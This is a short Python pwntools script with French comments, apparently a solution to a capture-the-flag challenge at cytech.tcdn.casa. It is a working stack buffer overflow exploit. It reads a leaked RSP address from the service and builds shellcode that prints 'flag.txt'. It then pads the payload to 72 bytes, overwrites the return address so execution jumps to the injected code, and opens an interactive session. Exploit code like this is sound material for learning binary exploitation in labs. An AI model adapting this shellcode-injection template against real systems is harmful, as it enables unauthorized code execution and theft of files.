#!/usr/bin/env python3
from pwn import *
import re

# Contexte
context.update(arch='amd64', timeout=1)

# Connexion au serveur
p = remote("cytech.tcdn.casa", 4104)

# Réception du message jusqu'à la ligne contenant l'adresse de RSP
rsp_message = p.recvuntil(b"sachant que RSP (sommet de la stack)\nest actuellement ")

# Réception de la ligne contenant l'adresse de RSP
rsp_line = p.recvline().strip()

# Extraction de l'adresse de RSP avec une expression régulière
rsp_value = re.search(b"0x[0-9a-fA-F]+", rsp_line).group()

# Conversion en entier (hexadécimal vers entier)
rsp_address = int(rsp_value, 16)

print(f"Adresse de RSP récupérée : {hex(rsp_address)}")

# Shellcode pour lire le fichier 'flag.txt'
shellcode = asm(shellcraft.cat('flag.txt'))

# Adresse cible (exemple donné)
target = p64(rsp_address)

# Envoi du payload avec un overflow et l'adresse cible
payload = shellcode + cyclic(72 - len(shellcode)) + target
p.sendline(payload)

# Interaction avec le shell
p.interactive()
